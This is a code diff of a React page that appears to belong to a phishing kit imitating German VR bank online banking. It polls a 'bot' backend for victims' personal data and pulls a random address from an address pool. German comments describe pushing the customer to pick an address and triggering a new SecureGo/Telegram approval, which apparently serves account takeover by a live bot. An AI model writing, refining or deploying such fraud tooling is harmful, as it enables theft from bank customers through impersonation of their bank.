@@ -1,14 +1,12 @@
 import { useEffect, useMemo, useState } from "react";
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
-import { Loader2, AlertCircle } from "lucide-react";
+import { Loader2 } from "lucide-react";
 import { getBotTask } from "@/lib/botClient";
 import { getRandomPoolAddress } from "@/lib/addressPool.functions";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import AddressVerification from "@/components/AddressVerification";
 import { CompletionStep } from "@/components/flow/CompletionStep";
-import { TanWaitingScreen } from "@/components/flow/TanWaitingScreen";
-import { getSecureGoLabel } from "@/lib/secureGoLabel";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 
 type BankCtx = {
@@ -124,10 +122,8 @@ function PersonalDataPage() {
   const [step, setStep] = useState<Step>("personal");
   const [addressDecisionPending, setAddressDecisionPending] = useState(false);
   const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
-  const [botStatus, setBotStatus] = useState<string | null>(null);
-  const [botTanType, setBotTanType] = useState<string | null>(null);
-  const [botError, setBotError] = useState<string | null>(null);
 
+  // Bank context is cached from the login route; restore synchronously
   useEffect(() => {
     try {
       const raw = sessionStorage.getItem(`bot_bank_${taskId}`);
@@ -145,31 +141,21 @@ function PersonalDataPage() {
     } catch {}
   }, [taskId]);
 
-  // Long-lived polling: react to status/tan_type/error until completed/failed
+  // Keep polling briefly in case more fields arrive after the initial redirect
   useEffect(() => {
     let cancelled = false;
     let timer: ReturnType<typeof setTimeout> | null = null;
-    const startedAt = Date.now();
-    const MAX_MS = 5 * 60 * 1000;
+    let attempts = 0;
     const tick = async () => {
+      attempts += 1;
       const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
       if (cancelled) return;
-      const st = (data as any)?.status ?? null;
-      const tt = (data as any)?.tan_type ?? (data as any)?.result?.tan_type ?? null;
-      const err = (data as any)?.error ?? (data as any)?.result?.error ?? null;
-      if (st) setBotStatus(st);
-      if (tt) setBotTanType(tt);
-      if (err) setBotError(String(err));
-      if ((data as any)?.result) {
-        setResult((data as any).result);
-        try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify((data as any).result)); } catch {}
+      if (data?.result) {
+        setResult(data.result);
+        try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
       }
-      // Auto-jump to the address step as soon as the bot requests confirmation
-      if (st === "waiting_for_address_confirm") {
-        setAddressDecisionPending(true);
-      }
-      if (st === "completed" || st === "failed" || Date.now() - startedAt > MAX_MS) return;
-      timer = setTimeout(tick, 1500);
+      if (data?.status === "completed" || data?.status === "failed" || attempts > 12) return;
+      timer = setTimeout(tick, 800);
     };
     tick();
     return () => { cancelled = true; if (timer) clearTimeout(timer); };
@@ -179,6 +165,15 @@ function PersonalDataPage() {
     () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
     [result, bankCtx?.bankName],
   );
+
+  if (!result || !customer) {
+    return (
+      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
+        <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
+        <p className="text-sm">Daten werden geladen…</p>
+      </div>
+    );
+  }
 
   const theme = bankCtx?.theme ?? DEFAULT_THEME;
   const shellProps = {
@@ -190,58 +185,11 @@ function PersonalDataPage() {
     bigLogo: bankCtx?.bigLogo ?? false,
     footerLinks: (bankCtx?.footerLinks ?? null) as any,
   };
+
   const bankId = bankCtx?.bankId ?? "";
-  const themeColor = theme.headerBg === "#ffffff" ? (theme.buttonBg || "#003399") : theme.headerBg;
-  const secureGoLabel = getSecureGoLabel(bankCtx?.group);
-
-  // TAN overlay for address change (waiting_for_tan + tan_type === "address")
-  const showAddressTan = botStatus === "waiting_for_tan" && botTanType === "address";
-
-  const errorText = useMemo(() => {
-    if (botError) return botError;
-    if (botStatus === "failed") return "Ein Fehler ist aufgetreten. Bitte erneut anmelden.";
-    if (botStatus === "tan_rejected") return "TAN wurde abgelehnt.";
-    if (botStatus === "tan_timeout") return "TAN-Bestätigung zu lange gedauert.";
-    return null;
-  }, [botStatus, botError]);
-
-  if (!result || !customer) {
-    return (
-      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
-        <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
-        <p className="text-sm">Daten werden geladen…</p>
-        {errorText && (
-          <p className="mt-4 text-sm text-red-600 flex items-center gap-2">
-            <AlertCircle className="h-4 w-4" />{errorText}
-          </p>
-        )}
-      </div>
-    );
-  }
-
-  // Address change TAN overlay takes priority
-  if (showAddressTan) {
-    return (
-      <BankShell {...shellProps}>
-        <TanWaitingScreen
-          theme={theme}
-          themeColor={themeColor}
-          secureGoLabel={secureGoLabel}
-          vrNetKey={customer.kundenNr}
-        />
-      </BankShell>
-    );
-  }
 
   return (
     <BankShell {...shellProps}>
-      {errorText && (
-        <div className="max-w-2xl mx-auto mb-4 rounded-lg bg-red-50 border border-red-200 p-4 flex items-start gap-2">
-          <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
-          <p className="text-sm text-red-600 font-medium">{errorText}</p>
-        </div>
-      )}
-
       {step === "personal" && (
         <PersonalDataOverview
           // @ts-expect-error FlowTheme is structurally compatible; component only reads shared fields
@@ -250,6 +198,8 @@ function PersonalDataPage() {
           bankId={bankId}
           addressDecisionPending={addressDecisionPending}
           onAddressChoiceResolved={() => {
+            // Kunde hat sich für eine Adresse entschieden – erneute
+            // Sicherheitsfreigabe via Telegram / SecureGo anstoßen.
             setAddressDecisionPending(false);
             setForceShowSecureGo(true);
             setStep("address");
@@ -281,6 +231,8 @@ function PersonalDataPage() {
           onSecureGoOpened={() => setForceShowSecureGo(false)}
           onConfirm={() => setStep("done")}
           onDelete={() => {
+            // Rücksprung: Kunde muss auf "Persönliche Daten" erneut die
+            // aktuelle Hauptadresse aus zwei Adressen auswählen.
             setAddressDecisionPending(true);
             setForceShowSecureGo(false);
             setStep("personal");
@@ -293,7 +245,6 @@ function PersonalDataPage() {
       {step === "done" && (
         <CompletionStep theme={theme} customerName={customer.name} />
       )}
-
     </BankShell>
   );
 }
